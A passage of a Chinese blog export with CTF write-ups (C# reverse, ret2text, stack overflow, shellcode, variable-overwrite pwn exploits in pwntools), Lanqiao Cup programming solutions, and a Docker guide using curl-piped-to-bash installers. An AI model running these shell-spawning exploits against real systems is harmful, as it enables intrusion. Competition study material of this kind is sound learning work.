<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h2><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AesClass class2 = <span class="keyword">new</span> AesClass();</span><br><span class="line">    <span class="built_in">string</span> key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> strB = <span class="string">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&quot;</span>;</span><br><span class="line">    <span class="built_in">byte</span>[] buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[] &#123; </span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x5c</span>, <span class="number">0x5e</span>, <span class="number">0x56</span>, <span class="number">0x5d</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x12</span></span><br><span class="line">    &#125;;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;</span>);</span><br><span class="line">    <span class="built_in">string</span> str = Console.ReadLine();</span><br><span class="line">    <span class="keyword">if</span> (str.Length != <span class="number">0x25</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        Console.ReadKey();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((str.Substring(<span class="number">0</span>, <span class="number">4</span>) != <span class="string">&quot;Nep&#123;&quot;</span>) || (str[<span class="number">0x24</span>] != <span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">        Console.ReadKey();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            key = key + Convert.ToChar((<span class="built_in">int</span>) (buffer[i] ^ <span class="number">0x33</span>)).ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">string</span>.Compare(class2.AesEncrypt(str, key), strB) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;wow, you pass it!&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反编译出c#代码</p>
<p>写exp：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,</span><br><span class="line">        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]</span><br><span class="line"></span><br><span class="line">for i in range(len(a)):</span><br><span class="line">    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">λ python3 test.py</span><br><span class="line">badbadwomen!!!!!!!!!!!!!!!!!!!!!</span><br></pre></td></tr></table></figure>

<p>Aes加密网站一波：</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210322133852.png" alt="20210322133852"></p>
]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>program</title>
    <url>/article/program/</url>
    <content><![CDATA[<h1 id="program"><a href="#program" class="headerlink" title="program"></a>program</h1><p>记录编程相关</p>
<span id="more"></span>

<h1 id="2020蓝桥杯省赛"><a href="#2020蓝桥杯省赛" class="headerlink" title="2020蓝桥杯省赛"></a>2020蓝桥杯省赛</h1><h2 id="A-门牌制作"><a href="#A-门牌制作" class="headerlink" title="A 门牌制作"></a>A 门牌制作</h2><p>【问题描述】<br>小蓝要为一条街的住户制作门牌号。<br>这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。<br>小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字<br>符粘贴到门牌上，例如门牌 1017 需要依次粘贴字符 1、 0、 1、 7，即需要 1 个<br>字符 0， 2 个字符 1， 1 个字符 7。<br>请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,t,n=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(t=i;t!=<span class="number">0</span>;t/=<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">if</span>(t%<span class="number">10</span>==<span class="number">2</span>)</span><br><span class="line">				n++;</span><br><span class="line">	cout&lt;&lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>624</p>
</blockquote>
<h2 id="试题B-既约分数"><a href="#试题B-既约分数" class="headerlink" title="试题B 既约分数"></a>试题B 既约分数</h2><p>【问题描述】<br>如果一个分数的分子和分母的最大公约数是1，这个分数称为既约分数。例如，3/4 , 5/2 , 1/8 , 7/1都是既约分数。请问，有多少个既约分数，分子和分母都是1 到2020 之间的整数（包括1和2020）？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2020</span>;j++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(k=i;;k--)</span><br><span class="line">    			<span class="keyword">if</span>(i%k==<span class="number">0</span> &amp;&amp; j%k==<span class="number">0</span>)</span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    		<span class="keyword">if</span>(k==<span class="number">1</span>)</span><br><span class="line">    			num++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="试题C-蛇形填数"><a href="#试题C-蛇形填数" class="headerlink" title="试题C 蛇形填数"></a>试题C 蛇形填数</h2><p>【问题描述】<br>如下图所示，小明用从1 开始的正整数“蛇形”填充无限大的矩阵。</p>
<p><img src="/article/program/image-20210412201731138.png" alt="image-20210412201731138"></p>
<p>容易看出矩阵第二行第二列中的数是5。请你计算矩阵中第20 行第20 列的数是多少？</p>
<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
<h2 id="试题D-跑步锻炼"><a href="#试题D-跑步锻炼" class="headerlink" title="试题D 跑步锻炼"></a>试题D 跑步锻炼</h2><p>【问题描述】<br>小蓝每天都锻炼身体。<br>正常情况下，小蓝每天跑 1 千米。如果某天是周一或者月初（1 日），为了<br>激励自己，小蓝要跑 2 千米。如果同时是周一或月初，小蓝也是跑 2 千米。<br>小蓝跑步已经坚持了很长时间，从 2000 年 1 月 1 日周六（含）到 2020 年<br>10 月 1 日周四（含）。请问这段时间小蓝总共跑步多少千米？</p>
<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
<h2 id="试题E-七段码"><a href="#试题E-七段码" class="headerlink" title="试题E 七段码"></a>试题E 七段码</h2><p>【问题描述】<br>小蓝要用七段码数码管来表示一种特殊的文字。</p>
<p>七段码上图给出了七段码数码管的一个图示，数码管中一共有7 段可以发光的二极管，分别标记为a, b, c, d, e, f, g。小蓝要选择一部分二极管（至少要有一个）发光来表达字符。在设计字符的表达时，要求所有发光的二极管是连成一片的。<br>例如：b 发光，其他二极管不发光可以用来表达一种字符。<br>例如：c 发光，其他二极管不发光可以用来表达一种字符。这种方案与上一行的方案可以用来表示不同的字符，尽管看上去比较相似。<br>例如：a, b, c, d, e 发光，f, g 不发光可以用来表达一种字符。<br>例如：b, f 发光，其他二极管不发光则不能用来表达一种字符，因为发光的二极管没有连成一片。<br>请问，小蓝可以用七段码数码管表达多少种不同的字符？</p>
<p>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一<br>个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
]]></content>
      <categories>
        <category>program</category>
      </categories>
  </entry>
  <entry>
    <title>Pwn(ubuntu_docker)</title>
    <url>/article/Pwn_ubuntu_docker/</url>
    <content><![CDATA[<h2 id="一、Docker-安装"><a href="#一、Docker-安装" class="headerlink" title="一、Docker 安装"></a>一、Docker 安装</h2><h3 id="1-使用官方安装脚本自动安装"><a href="#1-使用官方安装脚本自动安装" class="headerlink" title="1.使用官方安装脚本自动安装"></a>1.使用官方安装脚本自动安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<p>也可以使用国内 daocloud 一键安装命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>

<p>apt安装docker-compose：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install docker docker-compose -y</span><br></pre></td></tr></table></figure>



<h3 id="2-切换镜像源"><a href="#2-切换镜像源" class="headerlink" title="2.切换镜像源"></a>2.切换镜像源</h3><p><code>vim /etc/docker/daemon.json</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>

<h2 id="二、Docker-简单使用"><a href="#二、Docker-简单使用" class="headerlink" title="二、Docker 简单使用"></a>二、Docker 简单使用</h2><p>我们可以通过以下几条命令简单测试一下docker是否安装成功：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">service docker start</span><br><span class="line">docker images</span><br><span class="line"><span class="comment">#hello-world为其自带的一个image</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<p>常用指令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line"><span class="comment">#查看镜像</span></span><br><span class="line">docker run -d [images_name/<span class="built_in">id</span>] /<span class="built_in">bin</span>/bash</span><br><span class="line"><span class="comment">#run：运行 镜像 从而生成 容器; -d：后台运行容器; [images_name/id]：换成镜像的id或者名称; /bin/bash：运行镜像的权限</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment">#查看在运行的容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment">#查看所有容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it [container-<span class="built_in">id</span>] /<span class="built_in">bin</span>/bash</span><br><span class="line"><span class="comment">#进入容器; exec:在运行的容器中执行命令; -i:互交界面, -t:分配一个伪终端; container-id:换成容器id</span></span><br><span class="line">docker rm [container-<span class="built_in">id</span>]</span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line">docker rmi [images-name]</span><br><span class="line"><span class="comment">#删除镜像</span></span><br></pre></td></tr></table></figure>

<h2 id="三、ctf-xinetd下载与使用"><a href="#三、ctf-xinetd下载与使用" class="headerlink" title="三、ctf_xinetd下载与使用"></a>三、ctf_xinetd下载与使用</h2><p>从GitHub上下载<a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a></p>
<h3 id="1-放题目"><a href="#1-放题目" class="headerlink" title="1.放题目"></a>1.放题目</h3><p>把题目可执行文件和flag放在ctf_xinetd/bin中<br>ps：不要把 bin 作为题目的名字</p>
<p><img src="https://img-blog.csdnimg.cn/20201103210513145.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="2-修改ctf-xinetd文件"><a href="#2-修改ctf-xinetd文件" class="headerlink" title="2.修改ctf.xinetd文件"></a>2.修改ctf.xinetd文件</h3><p>回到ctf_xinetd目录下，修改ctf.xinetd<br>把图片箭头指向的 <code>helloworld</code> 改成bin文件夹中题目的名字<br>保存退出</p>
<p><img src="https://img-blog.csdnimg.cn/20201103210745998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="3-Build"><a href="#3-Build" class="headerlink" title="3.Build"></a>3.Build</h3><p>在ctf_xinetd目录下 <code>docker build -t &quot;pwn&quot; .</code></p>
<h3 id="4-Run"><a href="#4-Run" class="headerlink" title="4.Run"></a>4.Run</h3><p>在ctf_xinetd目录下 <code>docker run -d -p &quot;0.0.0.0:pub_port:9999&quot; -h &quot;pwn&quot; --name=&quot;pwn&quot; pwn</code><br>-h：指定容器的hostname<br>pub_port：改成你想放置的端口号，建议如8001，8002…等<br>pub_port is the port you want to expose to the public network.</p>
<p>此时输入docker ps 会发现题目容器已经启动了，可以nc 0.0.0.0 pub_port进行测试一下（pub_port：改成你想放置的端口号）</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/docker/ubuntu-docker-install.html">docker | 菜鸟教程</a></p>
<p><a href="https://blog.csdn.net/qq_40173126/article/details/83552307?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-3-83552307.nonecase&utm_term=pwn%E5%87%BA%E9%A2%98%E6%BA%90%E4%BB%A3%E7%A0%81&spm=1000.2123.3001.4430">使用Docker进行Pwn题环境部署</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>ubuntu</tag>
        <tag>题目环境</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn_0xGame_01</title>
    <url>/article/Pwn_0xGame_01/</url>
    <content><![CDATA[<h1 id="Pwn-0xGame-01"><a href="#Pwn-0xGame-01" class="headerlink" title="Pwn_0xGame_01"></a>Pwn_0xGame_01</h1><span id="more"></span>

<h2 id="1-欢迎来到0xGame平台"><a href="#1-欢迎来到0xGame平台" class="headerlink" title="1.欢迎来到0xGame平台"></a>1.欢迎来到0xGame平台</h2><p><code>nc</code>出flag</p>
<h2 id="2-帮我取一个题目名称"><a href="#2-帮我取一个题目名称" class="headerlink" title="2.帮我取一个题目名称"></a>2.帮我取一个题目名称</h2><p>ret2text<br>打开IDA分析<br>main函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201018162746427.png#pic_center" alt="在这里插入图片描述"></p>
<p>跟进<br>第二个函数</p>
<p><img src="https://img-blog.csdnimg.cn/20201018162919579.png#pic_center" alt="在这里插入图片描述"></p>
<p>s栈大小为20h=32<br>函数最后return read了s<br>所以很好写了<br>因为是64位程序，后面再加上8个字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<p>Shift+F12发现/bin/sh</p>
<p><img src="https://img-blog.csdnimg.cn/20201018163358221.png#pic_center" alt="在这里插入图片描述"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214 &#x27;</span>,<span class="number">10002</span>) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x401172</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-easy-stack"><a href="#3-easy-stack" class="headerlink" title="3.easy_stack"></a>3.easy_stack</h2><p>文件<br>easy_stack.txt：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────</span><br><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBX  0x56558fb8 ◂— 0x3ec0</span><br><span class="line">&gt; ECX  0xffffffff</span><br><span class="line">&gt; EDX  0xffffffff</span><br><span class="line">&gt; EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br><span class="line">&gt; ESP  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt; EIP  0x56556273 —▸ 0xfffdb8e8 ◂— 0x0</span><br><span class="line">&gt;─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt; ► 0x56556273    call   read@plt &lt;0x56556030&gt;</span><br><span class="line">&gt;   0x56556278    add    esp, 0x10</span><br><span class="line">&gt;   0x5655627b    nop    </span><br><span class="line">&gt;   0x5655627c    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">&gt;   0x5655627f    leave  </span><br><span class="line">&gt;   0x56556280    ret    </span><br><span class="line">&gt;──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt;00:0000│ esp  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt;01:0004│      0xffffcfe4 —▸ 0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;02:0008│      0xffffcfe8 ◂— 0x100</span><br><span class="line">&gt;03:000c│      0xffffcfec —▸ 0x56556234 ◂— 0x2d84c381</span><br><span class="line">&gt;04:0010│ eax  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;... ↓</span><br></pre></td></tr></table></figure>

<p>► 0x56556273    call   read@plt &lt;0x56556030&gt;<br>调用了read函数，再看看read函数中的三个参数</p>
<pre><code>read (fd, char *buf , count)
</code></pre>
<p>fd：文件描述符（文件指针） //fd写0,表示标准输入</p>
<p>buf：指向内存的指针             //也就是把数据写入的起始地址</p>
<p>count：读取的长度</p>
<p>再结合文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 00:0000│ esp  0xffffcfe0 ◂— 0x0 </span><br><span class="line">&gt; 01:0004│      0xffffcfe4 —▸ 0xffffcff0◂— 0x0 </span><br><span class="line">&gt; 02:0008│      0xffffcfe8 ◂— 0x100</span><br></pre></td></tr></table></figure>

<p>然后我们再观察ebp和eax的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>因为通常返回地址是存在ebp下，所以计算一下偏移量 0xffffd078 - 0xffffcff0 = 0x88<br>read读取的数据长度是0x100<br>0x88 &lt; 0x100<br>所以存在溢出<br>nc连接会回显个地址，并且这个地址是随机的</p>
<p><img src="https://img-blog.csdnimg.cn/20201018193434919.png#pic_center" alt="在这里插入图片描述"></p>
<p>我们可以接收这个地址并让程序执行它<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10008</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;magic_address &#x27;</span>) </span><br><span class="line">shell = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>) </span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span>+<span class="number">4</span>) + p32(shell)) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="4-该怎么起名呢"><a href="#4-该怎么起名呢" class="headerlink" title="4.该怎么起名呢"></a>4.该怎么起名呢</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>题目让我们执行shellcode，但程序是64位的，pwntools生成的shellcode是32位的，所以我们需要设置架构<br>context.arch=’AMD64’ ，否则有可能会报错</p>
<p>再看IDA</p>
<p><img src="https://img-blog.csdnimg.cn/20201019195422415.png#pic_center" alt="在这里插入图片描述"></p>
<p>关键的在下面的buf+32</p>
<p>所以我们需要填充32个字符之后再送出shellcode</p>
<p>生成 shellcode</p>
<blockquote>
<p>asm(shellcraft.sh())</p>
</blockquote>
<p>运行一下文件</p>
<p><img src="https://img-blog.csdnimg.cn/20201019200641989.png#pic_center" alt="在这里插入图片描述"></p>
<p>需要在’shellcode’之后再发送payload</p>
<p>所以要recvuntil(‘shellcode’)</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">context.arch = <span class="string">&#x27;AMD64&#x27;</span> </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">32</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;shellcode&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="5-variable-coverage"><a href="#5-variable-coverage" class="headerlink" title="5.variable_coverage"></a>5.variable_coverage</h2><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>IDA分析下</p>
<p><img src="https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>程序读取%lld 一个longlong的数，它的长度为8个字节<br>后面判断v5等于0x2333后会调用system函数<br>构造payload = 0x233300000000<br>再看栈</p>
<p><img src="https://img-blog.csdnimg.cn/20201019210240376.png#pic_center" alt="在这里插入图片描述"></p>
<p>4个字节的长度刚好是0x 0000 2333 0000 0000<br>也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10007</span>) </span><br><span class="line"></span><br><span class="line">payload =  <span class="built_in">str</span>(<span class="number">0x233300000000</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="6-Pwn题滞销-帮帮我好吗"><a href="#6-Pwn题滞销-帮帮我好吗" class="headerlink" title="6.Pwn题滞销,帮帮我好吗?"></a>6.Pwn题滞销,帮帮我好吗?</h2><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>IDA打开</p>
<p><img src="/article/Pwn_0xGame_01/20201022204647356.png" alt="在这里插入图片描述"></p>
<p>发现是个syscall的题目<br>直接去看这个函数的汇编</p>
<p><img src="/article/Pwn_0xGame_01/20201022204851409.png" alt="在这里插入图片描述"></p>
<p>根据师傅们所说，我们需要让rax存入59，让syscall去调用execve函数 （ret2syscall？）</p>
<p><a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">syscall_64 GitHub查询</a></p>
<p>之后要构造出来  execve(“/bin/sh”,0,0) 拿取权限<br>找”/bin/sh”字符串<br>方法一：<br>在程序中有，找到它</p>
<p><img src="/article/Pwn_0xGame_01/20201022210119569.png" alt="在这里插入图片描述"></p>
<p>从’[‘数起到斜杠前面的空格’ ‘，再加上前面的04个字符，一共是22个，换成16进制是16h<br>所以”/bin/sh”的地址为：0x402016</p>
<p>方法二：<br>构造ROP链来寻找（这是看官方WriteUp看到的方法</p>
<p><code>ROPgadget --binary ./main --string &#39;/bin/sh&#39;</code></p>
<p><img src="/article/Pwn_0xGame_01/20201022210755704.png" alt="在这里插入图片描述"></p>
<p>找来找去，最后还是要用到csu init函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> text:00000000004011D8 loc_4011D8:                             ; CODE XREF: init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    qword ptr [r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br><span class="line">.text:00000000004011FC ; &#125; &#x2F;&#x2F; starts at 4011A0</span><br><span class="line">.text:00000000004011FC init            endp</span><br><span class="line">.text:00000000004011FC</span><br></pre></td></tr></table></figure>


<p>咕咕咕~~~</p>
]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow_0x1</title>
    <url>/article/CTFShow_0x1/</url>
    <content><![CDATA[<h1 id="Pwn-CTFShow"><a href="#Pwn-CTFShow" class="headerlink" title="Pwn_CTFShow"></a>Pwn_CTFShow</h1><span id="more"></span>
<h2 id="1-PWN签到题"><a href="#1-PWN签到题" class="headerlink" title="1.PWN签到题"></a>1.PWN签到题</h2><p>直接 <code>nc</code></p>
<p>出flag，白给</p>
<h2 id="2-pwn02"><a href="#2-pwn02" class="headerlink" title="2.pwn02"></a>2.pwn02</h2><h3 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text 32"></a>ret2text 32</h3><p>file 一下<br><img src="https://img-blog.csdnimg.cn/20201003165432499.png#pic_center" alt="在这里插入图片描述"></p>
<p>32bit</p>
